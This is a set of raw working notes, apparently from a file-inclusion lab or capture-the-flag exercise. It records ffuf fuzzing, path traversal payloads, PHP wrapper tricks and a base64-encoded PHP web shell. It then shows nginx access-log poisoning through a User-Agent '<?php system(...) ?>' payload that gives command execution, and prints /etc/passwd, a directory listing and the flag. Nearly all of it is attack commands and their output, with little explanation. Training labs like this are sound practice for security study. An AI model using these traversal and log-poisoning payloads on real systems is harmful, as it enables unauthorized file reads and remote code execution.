# Skills Assessment - File Inclusion

http://94.237.62.195:43333/

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.62.195:43333/index.php?FUZZ=value' -fs 2287

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.62.195:43333/index.php?FUZZ=value' -fs 15829

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error
page                    [Status: 200, Size: 4322, Words: 797, Lines: 118, Duration: 8ms]

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:43333/index.php?page=FUZZ' -fs 15829

:: Progress: [40/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors/apache2/logs/access_log [Status: 200, Size: 4322, Words: 797, Lines: 118, Duration: 7ms]

http://94.237.62.195:43333/index.php?page=/apache2/logs/access_log

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.62.195:43333/index.php?page=FUZZ' -fs 4521,4322

--> Failed


http://94.237.63.93:54932/index.php?page=about

--> OK

http://94.237.63.93:54932/index.php?page=about.php

--> KO

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.93:54932/index.php?page=aboutFUZZ' -fs 15829

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.93:54932/index.php?page=aboutFUZZ' -fs 4322

:: Progress: [41/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow [Status: 200, Size: 4521, Words: 837, Lines: 127, Duration: 1ms]

http://94.237.63.93:54932/index.php?page=about..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow

--> Failed

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.93:54932/index.php?page=FUZZ' -fs 4322,4521

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.93:54932/index.php?page=FUZZ' -fs 4322



http://94.237.63.93:54932/index.php?page=....//....//....//....//etc/passwd

....//....//....//....//etc/passwd

echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

http://94.237.63.93:54932/index.php?page=non_existing_directory/../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

--> Failed

http://94.237.63.93:54932/index.php?page=config

http://94.237.63.93:54932/index.php?page=php://filter/read=convert.base64-encode/resource=config

--> Failed

curl "http://94.237.63.93:54932/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd"

--> Failed
        <h2>Invalid input detected!</h2>

echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

http://94.237.63.93:54932/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

--> Failed

curl "http://94.237.63.93:54932/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

--> Failed
        <h2>Invalid input detected!</h2>

http://94.237.63.93:54932/index.php?page=php://filter/read=convert.base64-encode/resource=index

echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDx0aXRsZT5JbmxhbmVGcmVpZ2h0PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9UG9wcGluczoyMDAsMzAwLDQwMCw3MDAsOTAwfERpc3BsYXkrUGxheWZhaXI6MjAwLDMwMCw0MDAsNzAwIj4gCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImZvbnRzL2ljb21vb24vc3R5bGUuY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvanF1ZXJ5LXVpLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wuY2Fyb3VzZWwubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuZGVmYXVsdC5taW4uY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5jc3MiPgoKICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZm9udHMvZmxhdGljb24vZm9udC9mbGF0aWNvbi5jc3MiPgoKCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYW9zLmNzcyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICAKICA8ZGl2IGNsYXNzPSJzaXRlLXdyYXAiPgoKICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLW1lbnUiPgogICAgICA8ZGl2IGNsYXNzPSJzaXRlLW1vYmlsZS1tZW51LWhlYWRlciI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1jbG9zZSBtdC0zIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWNsb3NlMiBqcy1tZW51LXRvZ2dsZSI+PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1ib2R5Ij48L2Rpdj4KICAgIDwvZGl2PgogICAgCiAgICA8aGVhZGVyIGNsYXNzPSJzaXRlLW5hdmJhciBweS0zIiByb2xlPSJiYW5uZXIiPgoKICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgIAogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTExIGNvbC14bC0yIj4KICAgICAgICAgICAgPGgxIGNsYXNzPSJtYi0wIj48YSBocmVmPSJpbmRleC5waHAiIGNsYXNzPSJ0ZXh0LXdoaXRlIGgyIG1iLTAiPklubGFuZUZyZWlnaHQ8L2E+PC9oMT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC0xMCBkLW5vbmUgZC14bC1ibG9jayI+CiAgICAgICAgICAgIDxuYXYgY2xhc3M9InNpdGUtbmF2aWdhdGlvbiBwb3NpdGlvbi1yZWxhdGl2ZSB0ZXh0LXJpZ2h0IiByb2xlPSJuYXZpZ2F0aW9uIj4KCiAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzaXRlLW1lbnUganMtY2xvbmUtbmF2IG14LWF1dG8gZC1ub25lIGQtbGctYmxvY2siPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPjxhIGhyZWY9ImluZGV4LnBocCI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWluZHVzdHJpZXMiPkluZHVzdHJpZXM8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CgkJPD9waHAgCgkJICAvLyBlY2hvICc8bGk+PGEgaHJlZj0iaWxmX2FkbWluL2luZGV4LnBocCI+QWRtaW48L2E+PC9saT4nOyAKCQk/PgogICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvbmF2PgogICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGQteGwtbm9uZSBtbC1tZC0wIG1yLWF1dG8gcHktMyIgc3R5bGU9InBvc2l0aW9uOiByZWxhdGl2ZTsgdG9wOiAzcHg7Ij48YSBocmVmPSIjIiBjbGFzcz0ic2l0ZS1tZW51LXRvZ2dsZSBqcy1tZW51LXRvZ2dsZSB0ZXh0LXdoaXRlIj48c3BhbiBjbGFzcz0iaWNvbi1tZW51IGgzIj48L3NwYW4+PC9hPjwvZGl2PgoKICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIAogICAgPC9oZWFkZXI+CgogIAoKICAgIDxkaXYgY2xhc3M9InNpdGUtYmxvY2tzLWNvdmVyIG92ZXJsYXkiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaW1hZ2VzL2hlcm9fYmdfMS5qcGcpOyIgZGF0YS1hb3M9ImZhZGUiIGRhdGEtc3RlbGxhci1iYWNrZ3JvdW5kLXJhdGlvPSIwLjUiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBhbGlnbi1pdGVtcy1jZW50ZXIganVzdGlmeS1jb250ZW50LWNlbnRlciB0ZXh0LWNlbnRlciI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiIGRhdGEtYW9zPSJmYWRlLXVwIiBkYXRhLWFvcy1kZWxheT0iNDAwIj4KICAgICAgICAgICAgCgogICAgICAgICAgICA8aDEgY2xhc3M9InRleHQtd2hpdGUgZm9udC13ZWlnaHQtbGlnaHQgbWItNSB0ZXh0LXVwcGVyY2FzZSBmb250LXdlaWdodC1ib2xkIj5Xb3JsZHdpZGUgRnJlaWdodCBTZXJ2aWNlczwvaDE+CiAgICAgICAgICAgIDxwPjxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgcHktMyBweC01IHRleHQtd2hpdGUiPkdldCBTdGFydGVkITwvYT48L3A+CgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+ICAKCjw/cGhwCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgewogIGluY2x1ZGUgIm1haW4ucGhwIjsKfQplbHNlIHsKICAkcGFnZSA9ICRfR0VUWydwYWdlJ107CiAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7CiAgICBpbmNsdWRlICJlcnJvci5waHAiOwogIH0KICBlbHNlIHsKICAgIGluY2x1ZGUgJHBhZ2UgLiAiLnBocCI7CiAgfQp9Cj8+CiAgICA8Zm9vdGVyIGNsYXNzPSJzaXRlLWZvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IHB0LTUgbXQtNSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItdG9wIHB0LTUiPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgQ29weXJpZ2h0ICZjb3B5OzxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUobmV3IERhdGUoKS5nZXRGdWxsWWVhcigpKTs8L3NjcmlwdD4gQWxsIHJpZ2h0cyByZXNlcnZlZCB8IFRoaXMgdGVtcGxhdGUgaXMgbWFkZSB3aXRoIDxpIGNsYXNzPSJpY29uLWhlYXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBieSA8YSBocmVmPSJodHRwczovL2NvbG9ybGliLmNvbSIgdGFyZ2V0PSJfYmxhbmsiID5Db2xvcmxpYjwvYT4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgPC9mb290ZXI+CiAgPC9kaXY+CgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LW1pZ3JhdGUtMy4wLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LXVpLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9vd2wuY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LnN0ZWxsYXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmNvdW50ZG93bi5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnkubWFnbmlmaWMtcG9wdXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYW9zLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgCiAgPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d

		<?php 
		  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
		?>



<?php
if(!isset($_GET['page'])) {
  include "main.php";
}
else {
  $page = $_GET['page'];
  if (strpos($page, "..") !== false) {
    include "error.php";
  }
  else {
    include $page . ".php";
  }
}
?>

http://94.237.63.93:54932/index.php?page=....//....//....//....//etc/passwd%00

--> Failed

http://94.237.63.93:54932/index.php?page=.../.../.../.../etc/passwd%00

--> Failed

Intercepting response with burp :

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 02 Jan 2024 05:13:13 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.22
Content-Length: 10462

http://94.237.63.93:54932/index.php?page=ilf_admin/index.php

http://94.237.63.93:54932/ilf_admin/index.php

http://94.237.63.93:54932/ilf_admin/index.php?log=system.log

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.93:54932/ilf_admin/index.php?log=system.logFUZZ'

ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.63.93:54932/ilf_admin/index.php?log=system.logFUZZ' -fs 2046

:: Progress: [40/870] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 2ms]

http://94.237.63.93:54932/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin

http://94.237.63.93:54932/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Froot%flag.txt

--> Failed

http://94.237.63.93:54932/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log

10.30.12.112 - - [02/Jan/2024:05:23:12 +0000] "GET /ilf_admin/js/bootstrap.js HTTP/1.1" 404 188 "http://94.237.63.93:54932/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Froot%flag.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"


http://94.237.55.163:51973/ilf_admin/index.php?log=system.log

http:/94.237.55.163:51973/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log

10.30.12.137 - - [02/Jan/2024:05:35:30 +0000] "GET /ilf_admin/index.php?log=system.log HTTP/1.1" 200 43125 "-" "toto"

http://94.237.55.163:51973/ilf_admin/index.php?log=system.log

User-Agent:<?php system($_GET["cmd"]); ?>

10.30.12.137 - - [02/Jan/2024:05:37:11 +0000] "GET /ilf_admin/index.php?log=system.log HTTP/1.1" 200 43125 "-" "

http://94.237.55.163:51973/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log&cmd=id

User-Agent: <?php system($_GET["cmd"]); ?>

http://94.237.55.163:47265/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log

curl -s "http://83.136.250.104:47184/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log" -A "<?php system($_GET['cmd']); ?>"

http://83.136.250.104:47184/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log?cmd=id

curl -s "http://83.136.250.104:47184/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log" -A "toto"

curl -s "http://83.136.250.104:47184/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log?cmd=id" -A "<?php system($_GET['cmd']); ?>"

curl -s "http://83.136.250.104:47184/ilf_admin/index.php?log=system.log?cmd=id" -A "<?php system($_GET['cmd']); ?>"

http://83.136.250.104:47184/ilf_admin/index.php?log=system.log..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log?cmd=id


curl -s "http://83.136.251.235:36167/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt" -A "<?php system($_GET['cmd']); ?>"

http://83.136.251.235:36167/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt

User-Agent:<?php system($_GET["cmd"]); ?>

--> Failed

http://94.237.56.188:53662/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

curl -i -v http://94.237.56.188:53662 6 -A "<?php system('ls -l /'); ?>"

http://94.237.56.188:53662/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

10.30.12.117 - - [02/Jan/2024:11:54:36 +0000] "GET / HTTP/1.1" 200 15850 "-" "total 64
drwxr-xr-x    2 root     root          4096 May 29  2020 bin
drwxr-xr-x    5 root     root           360 Jan  2 11:52 dev
drwxr-xr-x    1 root     root          4096 Jan  2 11:52 etc
-rw-r--r--    1 root     root            33 Sep  9  2020 flag_dacc60f2348d.txt
drwxr-xr-x    2 root     root          4096 May 29  2020 home
drwxr-xr-x    1 root     root          4096 Sep  9  2020 lib
drwxr-xr-x    5 root     root          4096 May 29  2020 media
drwxr-xr-x    2 root     root          4096 May 29  2020 mnt
drwxr-xr-x    2 root     root          4096 May 29  2020 opt
dr-xr-xr-x  454 root     root             0 Jan  2 11:52 proc
drwx------    2 root     root          4096 May 29  2020 root
drwxr-xr-x    1 nobody   nobody        4096 Jan  2 11:52 run
drwxr-xr-x    2 root     root          4096 May 29  2020 sbin
drwxr-xr-x    2 root     root          4096 May 29  2020 srv
dr-xr-xr-x   13 root     root             0 Jan  2 11:52 sys
drwxrwxrwt    1 root     root          4096 Jan  2 11:52 tmp
drwxr-xr-x    1 root     root          4096 Sep  9  2020 usr
drwxr-xr-x    1 root     root          4096 Sep  9  2020 var
"

curl -i -v http://94.237.56.188:53662 6 -A "<?php system('cat /flag_dacc60f2348d.txt'); ?>"


http://94.237.56.188:53662/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log

10.30.12.117 - - [02/Jan/2024:11:55:33 +0000] "GET / HTTP/1.1" 200 15850 "-" "a9a892dbc9faf9a014f58e007721835e
"